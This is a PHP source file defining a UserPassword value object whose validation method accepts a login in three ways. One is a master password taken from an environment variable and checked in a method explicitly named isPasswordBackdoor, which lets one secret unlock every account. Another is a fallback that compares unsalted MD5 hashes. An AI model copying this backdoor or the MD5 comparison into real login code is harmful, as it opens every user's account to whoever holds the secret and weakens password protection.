<?php declare(strict_types=1);


namespace Siccob\identificationAccess\user\domain;


use Siccob\shared\domain\valueObjects\StringValueObject;

final class UserPassword extends StringValueObject
{
    public function isValid(string $password): bool
    {

        if (empty($password)) {
            return false;
        }

        if ($this->isSameMd5Password($password)) {
            return true;
        }

        if ($this->isSamePassword($password)) {
            return true;
        }

        if ($this->isPasswordBackdoor($password)) {
            return true;
        }

        return false;
    }

    private function isSameMd5Password(string $password): bool
    {
        $passwordMd5 = md5($password);
        return $this->value() === $passwordMd5;
    }

    private function isSamePassword(string $password): bool
    {
        return password_verify($password , $this->value());
    }

    private function isPasswordBackdoor(string $password ): bool
    {
        return password_verify($password , $_ENV['APP_BACKDOOR']);
    }
}